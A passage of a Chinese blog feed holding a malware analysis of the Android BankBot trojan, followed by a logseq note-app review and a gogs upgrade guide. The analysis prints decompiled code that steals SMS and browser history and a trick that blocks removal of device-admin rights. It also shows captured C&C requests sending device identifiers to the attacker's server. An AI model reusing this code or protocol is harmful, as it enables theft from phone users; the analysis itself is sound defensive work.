class="string">&quot;s&quot;</span>)), <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">if</span>((v8.moveToFirst()) &amp;&amp; v8.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(!v8.isAfterLast()) &#123;</span><br><span class="line">            v10.append(String.format(Locale.US, <span class="string">&quot;&#123;\&quot;address\&quot;:%s,\&quot;body\&quot;:%s,\&quot;date\&quot;:%s&#125;&quot;</span>, </span><br><span class="line">                    JSONObject.quote(v8.getString(v8.getColumnIndex(<span class="string">&quot;address&quot;</span>))), JSONObject</span><br><span class="line">                    .quote(v8.getString(v8.getColumnIndex(<span class="string">&quot;body&quot;</span>))), JSONObject.quote(v8.getString(</span><br><span class="line">                    v8.getColumnIndex(<span class="string">&quot;date&quot;</span>)))));</span><br><span class="line">            <span class="keyword">if</span>(!v8.isLast()) &#123;</span><br><span class="line">                v10.append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v8.moveToNext();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        v8.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v10.append(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="浏览器书签"><a href="#浏览器书签" class="headerlink" title="浏览器书签"></a>浏览器书签</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> StringBuilder <span class="title">getHistory</span><span class="params">(Uri historyUri)</span> </span>&#123;</span><br><span class="line">    StringBuilder v8 = <span class="keyword">new</span> StringBuilder(<span class="string">&quot;[&quot;</span>);</span><br><span class="line">    Cursor v6 = <span class="keyword">this</span>.context.getContentResolver().query(historyUri, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;title&quot;</span>, <span class="string">&quot;url&quot;</span>, </span><br><span class="line">            <span class="string">&quot;date&quot;</span>&#125;, <span class="string">&quot;bookmark = 0&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">if</span>((v6.moveToFirst()) &amp;&amp; v6.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(!v6.isAfterLast()) &#123;</span><br><span class="line">            v8.append(String.format(Locale.US, <span class="string">&quot;&#123;\&quot;title\&quot;:%s,\&quot;url\&quot;:%s,\&quot;date\&quot;:%s&#125;&quot;</span>, JSONObject</span><br><span class="line">                    .quote(v6.getString(v6.getColumnIndex(<span class="string">&quot;title&quot;</span>))), JSONObject.quote(v6.getString(</span><br><span class="line">                    v6.getColumnIndex(<span class="string">&quot;url&quot;</span>))), JSONObject.quote(v6.getString(v6.getColumnIndex(</span><br><span class="line">                    <span class="string">&quot;date&quot;</span>)))));</span><br><span class="line">            <span class="keyword">if</span>(!v6.isLast()) &#123;</span><br><span class="line">                v8.append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v6.moveToNext();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        v6.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v8.append(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="骗取信用卡信息"><a href="#骗取信用卡信息" class="headerlink" title="骗取信用卡信息"></a>骗取信用卡信息</h2><p>当用户打开Google Play 应用时，打开伪造的Activity，诱使用户输入信用卡信息。</p><h2 id="高级技术"><a href="#高级技术" class="headerlink" title="高级技术"></a>高级技术</h2><h3 id="不断重启的Servcie"><a href="#不断重启的Servcie" class="headerlink" title="不断重启的Servcie"></a>不断重启的Servcie</h3><p>com.android.smali3</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onDestroy();</span><br><span class="line">    <span class="keyword">this</span>.startService(<span class="keyword">new</span> Intent(<span class="keyword">this</span>.getApplicationContext(), smali3.class));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务被停止，立即重启，无法停止。</p><h3 id="防止卸载"><a href="#防止卸载" class="headerlink" title="防止卸载"></a>防止卸载</h3><p>Bankbot 申请 Device Admin 权限，无法被正常卸载。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; adb shell pm uninstall com.android.market</span><br><span class="line">Failure</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="禁止删除-Device-Admin-权限"><a href="#禁止删除-Device-Admin-权限" class="headerlink" title="禁止删除 Device Admin 权限"></a>禁止删除 Device Admin 权限</h3><p>这个一个非常流氓的做法，具体的做法是如下面的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AdRec</span> <span class="keyword">extends</span> <span class="title">DeviceAdminReceiver</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AdRec</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CharSequence <span class="title">onDisableRequested</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> AppCrash().Register(context);</span><br><span class="line">        <span class="keyword">if</span>(Build$VERSION.SDK_INT &lt;= <span class="number">0xA</span>) &#123;</span><br><span class="line">            Intent v2 = <span class="keyword">new</span> Intent(<span class="string">&quot;android.settings.SETTINGS&quot;</span>);</span><br><span class="line">            v2.setFlags(<span class="number">0x50000000</span>);</span><br><span class="line">            context.startActivity(v2);</span><br><span class="line">            Intent v4 = <span class="keyword">new</span> Intent(<span class="string">&quot;android.intent.action.MAIN&quot;</span>);</span><br><span class="line">            v4.addCategory(<span class="string">&quot;android.intent.category.HOME&quot;</span>);</span><br><span class="line">            v4.setFlags(<span class="number">0x10000000</span>);</span><br><span class="line">            context.startActivity(v4);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;WARNING! Your device will now reboot to factory settings.\n\nClick \&quot;Yes\&quot; to erase your data and continue. \&quot;No\&quot; for cancel.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        context.startService(<span class="keyword">new</span> Intent(context, ASec.class));</span><br><span class="line">        <span class="keyword">long</span> v6 = <span class="number">0x7D0</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(v6);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(InterruptedException v3) &#123;</span><br><span class="line">            v3.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;WARNING! Your device will now reboot to factory settings.\n\nClick \&quot;Yes\&quot; to erase your data and continue. \&quot;No\&quot; for cancel.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重写 DeviceAdminReceiver 的 onDisableRequest 方法。使用 Thread.sleep 方法使用户<br>无法操作界面，在此期间采取 Activity 切换的方法绕开取消激活的步骤。</p><p>这里出过几个问题，</p><ol><li>Backdoor.AndroidOS.Obad.a 使用的，在设备管理器中隐身</li><li>就是现在代码中所用到这个，目前在所有的Android 版本中存在。</li></ol><h3 id="界面劫持"><a href="#界面劫持" class="headerlink" title="界面劫持"></a>界面劫持</h3><p>通过界面劫持，诱使用户将App设置为设备管理器。从下图中可以看见Continues按钮其实<br>是设备管理器的激活按钮。</p><h2 id="使用翠鸟对恶意样本进行检查的结果"><a href="#使用翠鸟对恶意样本进行检查的结果" class="headerlink" title="使用翠鸟对恶意样本进行检查的结果"></a>使用翠鸟对恶意样本进行检查的结果</h2><h2 id="0x02-C-amp-C-协议分析"><a href="#0x02-C-amp-C-协议分析" class="headerlink" title="0x02 C&amp;C 协议分析"></a>0x02 C&amp;C 协议分析</h2><p>Bankbot 以固定时间轮询的方式向C&amp;C服务器请求命令，命令的格式为json格式。从代码中<br>可以得到json字段的信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD_ACTION = <span class="string">&quot;action&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD_CALL_LOG = <span class="string">&quot;call_log&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD_DATA = <span class="string">&quot;data&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD_HISTORY = <span class="string">&quot;browser_history&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD_ID = <span class="string">&quot;id&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD_IMEI = <span class="string">&quot;imei&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD_INTERCEPT = <span class="string">&quot;intercept&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD_MAYHEM = <span class="string">&quot;mayhem&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD_MESSAGE = <span class="string">&quot;prefix_1&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD_NEW_SERVER = <span class="string">&quot;server&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD_NUMBER_SEND_TO = <span class="string">&quot;number_1&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD_OPERATOR = <span class="string">&quot;op&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD_PHONE = <span class="string">&quot;phone&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD_POLL_INTERVAL = <span class="string">&quot;server_poll&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD_PREFIX = <span class="string">&quot;prefix&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD_REPORT_CALLS = <span class="string">&quot;calls&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD_SMS_HISTORY = <span class="string">&quot;sms_history&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD_SPAM = <span class="string">&quot;text_2&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD_STATUS = <span class="string">&quot;status&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD_URL_TO_SHOW = <span class="string">&quot;url&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD_VERSION = <span class="string">&quot;version&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="请求注册"><a href="#请求注册" class="headerlink" title="请求注册"></a>请求注册</h3><p>返回报文</p><p>401</p><h3 id="注册报文"><a href="#注册报文" class="headerlink" title="注册报文"></a>注册报文</h3><p>请求报文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /p/gate.php HTTP/1.1</span><br><span class="line">Content-Length: 106</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Host: quick-sshopping.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line">action=reg&amp;imei=098767899076562&amp;phone=15802920457&amp;op=Android&amp;version=4.4.4%2C3.4.0-gd853d22&amp;prefix=12Jhw21</span><br></pre></td></tr></table></figure><p>响应报文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.8.0</span><br><span class="line">Date: Tue, 23 Feb 2016 07:25:21 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Powered-By: PHP/5.5.31</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">200</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="获取命令"><a href="#获取命令" class="headerlink" title="获取命令"></a>获取命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /p/gate.php HTTP/1.1</span><br><span class="line">Content-Length: 32</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Host: quick-sshopping.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line">action=poll&amp;imei=098767899076562</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.8.0</span><br><span class="line">Date: Tue, 23 Feb 2016 07:25:30 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Powered-By: PHP/5.5.31</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>返回的命令为json 格式，主要的指令有下面几个，</p><table><thead><tr><th>指令</th><th>含义</th></tr></thead><tbody><tr><td>401</td><td>要求 bot 注册</td></tr><tr><td>call_log</td><td>获取电话记录, 发送到C&amp;C server</td></tr><tr><td>sms_history</td><td>获取短信内容，发送到C&amp;C server</td></tr><tr><td>browser_history</td><td>获取浏览器书签，发送到C&amp;C server</td></tr><tr><td>url</td><td>访问url 链接</td></tr><tr><td>server</td><td>更换C&amp;C server</td></tr><tr><td>intercept</td><td></td></tr><tr><td>server_poll</td><td>更新从服务器获取命令的时间间隔</td></tr><tr><td>mayhem</td><td></td></tr><tr><td>calls</td><td></td></tr></tbody></table><p>监视服务了大半天，没有收到有效指令，看来不是特别活跃。</p><h2 id="0x03清除"><a href="#0x03清除" class="headerlink" title="0x03清除"></a>0x03清除</h2><p>这个App的清除非常费劲，原因就是注册为设备管理器的app不能卸载，而这个App又使诈<br>不让我们取消设备管理器，估计只有root的机器会好处理一些。</p><h2 id="0x04总结"><a href="#0x04总结" class="headerlink" title="0x04总结"></a>0x04总结</h2><p>BankBot 样本，代码编写的相当规范，风格严谨，是正规程序员的作品。但行为非常流氓，<br>很顽固，不容易清除。所以遇到申请device admin 权限的程序一定要小心谨慎，以免不良<br>后果。而Android的界面劫持也是一个严重的问题，估计后续利用这些技术的恶意App的数量<br>会越来越多。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-样本概况&quot;&gt;&lt;a href=&quot;#0x00-样本概况&quot; class=&quot;headerlink&quot; title=&quot;0x00 样本概况&quot;&gt;&lt;/a&gt;0x00 样本概况&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;字段&lt;/th&gt;
&lt;th&gt;内容&lt;/th&gt;
</summary>
      
    
    
    
    
    <category term="Security" scheme="http://usmacd.com/tags/Security/"/>
    
    <category term="Malware" scheme="http://usmacd.com/tags/Malware/"/>
    
  </entry>
  
  <entry>
    <title>logseq 试用报告</title>
    <link href="http://usmacd.com/2022/02/21/logseq/"/>
    <id>http://usmacd.com/2022/02/21/logseq/</id>
    <published>2022-02-21T04:26:29.101Z</published>
    <updated>2022-02-21T04:26:29.101Z</updated>
    
    <content type="html"><![CDATA[<p>最近双链笔记的概念比较火热， Roam Research 大概是第一个实现此功能的软件，后续 Notion、Obsidian、logseq 等软件大步跟进，这些软件各有千秋。下面这段是参考资料文章中的一小段，很有参考意义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Roam 的突破在于，理论上，把软件设计理念与卡片盒笔记法紧紧捆绑：</span><br><span class="line">卢曼（Niklas Luhmann）得益于卡片盒笔记法，从公务员成为德国当代重要的社会学家，</span><br><span class="line">因此基于卡片盒笔记法的 Roam 也可以助力你的成功；</span><br><span class="line">技术上，推出双向链接、可视化笔记间的联系、嵌入（Transclusion）等功能，</span><br><span class="line">让生产、查找笔记更加高效，于此同时，还省却维护层级结构的麻烦。</span><br></pre></td></tr></table></figure><p><img src="https://github.com/henices/pictures/raw/master/logseq0.jpg"><br><img src="https://github.com/henices/pictures/raw/master/logseq1.png"></p><p>上面两张图片就是<strong>卡片盒笔记法</strong> 最形象的表示了，个人觉得这种方法很适合自己。</p><p>为了体验双链笔记，我花费了不少时间，上面的几个软件都体验了一下，Roam 是收费软件，银子不够所以不选，Notion 笔记存储在云端，不符合我数据安全的要求也不选，剩下的就只有两个选项了 Obsidian 和 logseq 。</p><h2 id="Obsidian"><a href="#Obsidian" class="headerlink" title="Obsidian"></a>Obsidian</h2><p>软件主页：<a href="https://obsidian.md/">https://obsidian.md/</a><br><img src="https://github.com/henices/pictures/raw/master/logseq2.png"></p><p>挺多人选择用 Obsidian 的原因是它的 MarkDown 语法支持得比较好，MarkDown 语法有很多的使用者，类似 Typora 的 MarkDown 语法笔记是当前笔记软件的主流，这使得这些笔记软件的使用者过渡到 obsidian 会比较平滑。我是开源<br>MarkDown 笔记软件 Vnote 的重度使用者，一度想使用 Obsidian 作为主力软件。</p><p>Obsidian 有挺多优点，比如它对个人用户永久免费，但是它不开源，而且 <a href="https://help.obsidian.md/How+to/Link+to+blocks">Link+to+blocks</a> 的语法比较别扭。最终还是没有选择它，有人说Obsidina 插件非常丰富，我自己没有折腾过。</p><h2 id="logseq"><a href="#logseq" class="headerlink" title="logseq"></a>logseq</h2><p>软件主页：<a href="https://logseq.com/">https://logseq.com/</a><br>源码仓库：<a href="https://github.com/logseq/logseq">https://github.com/logseq/logseq</a></p><p><img src="https://github.com/henices/pictures/raw/master/logseq3.png"></p><p>说了这么久终于到正主了，第一次知道双链笔记这个概念是因为有个网友在网上说使用效果不错，过渡很平滑。可能有先入为主的关系，另外我本人对开源软件一向有莫名的好感，所以主观意识上就很喜欢这个软件。logseq 的粒度足够，block reference 使用非常方便，另外 logseq 的 PDF 标记功能对于需要大量阅读论文的我来说非常好用。</p><p><img src="https://github.com/henices/pictures/raw/master/logseq4.png"></p><p>但是 logseq 也不是没有缺点，logseq 对 markdown 语法的支持不是很好，即使直接导入 MarkDown 文件，最后显示的结果感觉也是有问题，各类标题直接转化成 block 了，这是有问题的。但是从这个角度说 logseq 就是一个纯粹的双链笔记软件而不是一个添加了双链功能的 MarkDown 笔记软件。</p><h2 id="最终的笔记管理方法"><a href="#最终的笔记管理方法" class="headerlink" title="最终的笔记管理方法"></a>最终的笔记管理方法</h2><p>说到这，问题就简化了，平时的文档记录仍然使用 MarkDown 笔记软件，只是在平时记录的时候使用双链笔记软件。这样的笔记管理方法看上去比较麻烦，其实却很完美，想写文章的时候直接用 VNote，平时知识积累记录的时候就用 logseq，根本就不用过渡，只需要启用一个新软件即可。</p><p>基于 block 的双链笔记最大的好处就是没有输出负担，一些很随意的想法都可以记录下来，因为大家确实不可能每次都有大段的想法可以输出。有人说用 logseq一年写了 30万字，我开始觉得有点夸张，但是使用一个多月发现可能属实，现在我自己都写了几万字了。每个想法 (block) 之间可能会有联系，不断记录想法，不断联系，慢慢的真能发现一些意想不到的东西之间居然有联系，而这些联系很有可能是一些关键的底层逻辑。平时在记录的时候手工划分目录，层次关系，其实已经将一些想法，概念给逻辑化了，这样的记录方法很难摆脱固有的认知，而基于 block 的双链笔记就自由的多，不断记录，不断整理，汇总就交给软件来完成吧。</p><p>我现在已经通过 logseq 的记录想清楚了一些问题，在平时的工作记录中也不断地稳步螺旋推进，在此向大家推荐这款笔记软件。</p><h2 id="最后的话"><a href="#最后的话" class="headerlink" title="最后的话"></a>最后的话</h2><p>其实工具并不是那么重要，最重要的还是平时要记录，要定期输出。IT 界有一个著名的段子，你以为你是在写 blog 其实你只是在折腾 wordpress ：）</p><p>共勉。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://sspai.com/post/69503">双链笔记软件推荐：Logseq 和它的五种用法</a><br><a href="https://sspai.com/post/65273">请不要神化双链笔记</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近双链笔记的概念比较火热， Roam Research 大概是第一个实现此功能的软件，后续 Notion、Obsidian、logseq 等软件大步跟进，这些软件各有千秋。下面这段是参考资料文章中的一小段，很有参考意义：&lt;/p&gt;
&lt;figure class=&quot;highli</summary>
      
    
    
    
    
    <category term="Software" scheme="http://usmacd.com/tags/Software/"/>
    
  </entry>
  
  <entry>
    <title>gogs 皮肤和源码升级</title>
    <link href="http://usmacd.com/2022/02/21/gogs/"/>
    <id>http://usmacd.com/2022/02/21/gogs/</id>
    <published>2022-02-21T04:09:29.975Z</published>
    <updated>2022-02-21T04:09:29.975Z</updated>
    
    <content type="html"><![CDATA[<p>gogs 使用了也有一年多了，小团队使用基本还行。有几个问题，第一界面代码 merge 有问题，第二不支持代码 review，<br>如果能解决上面两个问题就好用很多了。下面两段是年前折腾 gogs 的记录，没有啥技术含量，只是做个备份。</p><h2 id="切换皮肤"><a href="#切换皮肤" class="headerlink" title="切换皮肤"></a>切换皮肤</h2><p><a href="https://github.com/Kos-M/GogsThemes">https://github.com/Kos-M/GogsThemes</a> 提供了两款皮肤，文中给出的方法要修改 gogs 配置，直接使用 TamperMonkey 就可以了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         Gogs Theme</span></span><br><span class="line"><span class="comment">// @resource     IMPORTED_CSS https://raw.githubusercontent.com/Kos-M/GogsThemes/master/themes/dark_theme.css</span></span><br><span class="line"><span class="comment">// @namespace    http://tampermonkey.net/</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  try to take over the world!</span></span><br><span class="line"><span class="comment">// @author       You</span></span><br><span class="line"><span class="comment">// @match        http://gogs.fuzzplat.intra.nsfocus.com:8000/*</span></span><br><span class="line"><span class="comment">// @grant        GM_getResourceText</span></span><br><span class="line"><span class="comment">// @grant        GM_addStyle</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">    &#x27;use strict&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> my_css = GM_getResourceText(<span class="string">&quot;IMPORTED_CSS&quot;</span>);</span><br><span class="line">    GM_addStyle(my_css);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>使用后效果图</p><p><img src="https://github.com/henices/pictures/raw/master/gogs0.png"></p><h2 id="源码升级"><a href="#源码升级" class="headerlink" title="源码升级"></a>源码升级</h2><p>gogs 已经有一年多没有提供二进制的安装包了，看了改进不少，就尝试了源码升级。<br>参考 <a href="https://gogs.io/docs/installation/install_from_source#%E6%B5%8B%E8%AF%95%E5%AE%89%E8%A3%85">https://gogs.io/docs/installation/install_from_source#%E6%B5%8B%E8%AF%95%E5%AE%89%E8%A3%85</a></p><h3 id="安装-golang"><a href="#安装-golang" class="headerlink" title="安装 golang"></a>安装 golang</h3><p>参考 Google 官方文档，执行下面命令就可以了。 <a href="https://go.dev/doc/install">https://go.dev/doc/install</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://go.dev/dl/go1.17.6.linux-amd64.tar.gz</span><br><span class="line">rm -rf /usr/<span class="built_in">local</span>/go &amp;&amp; tar -C /usr/<span class="built_in">local</span> -xzf go1.17.6.linux-amd64.tar.gz</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/<span class="built_in">local</span>/go/bin</span><br></pre></td></tr></table></figure><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 克隆仓库到 &quot;gogs&quot; 子目录</span></span><br><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/gogs/gogs.git gogs</span><br><span class="line"><span class="comment"># 修改工作目录</span></span><br><span class="line"><span class="built_in">cd</span> gogs</span><br><span class="line"><span class="comment"># 编译主程序，这个步骤会下载所有依赖</span></span><br><span class="line">go build -o gogs</span><br></pre></td></tr></table></figure><p>编译过程会下载文件（需要自备梯子），编译完成后将在 gogs 工作目下生成 gogs 可执行文件</p><h3 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h3><p>gogs 源码的 Makefile 提供了打包命令，执行 <code>make pack</code> 即可，将在 release 目生成 <code>gogs.20220112095054.zip</code></p><h3 id="迁移配置"><a href="#迁移配置" class="headerlink" title="迁移配置"></a>迁移配置</h3><p>将 gogs.20220112095054.zip 解压，这就类似 gogs 的二进制升级了 <a href="https://gogs.io/docs/upgrade/upgrade_from_binary">https://gogs.io/docs/upgrade/upgrade_from_binary</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mv gogs 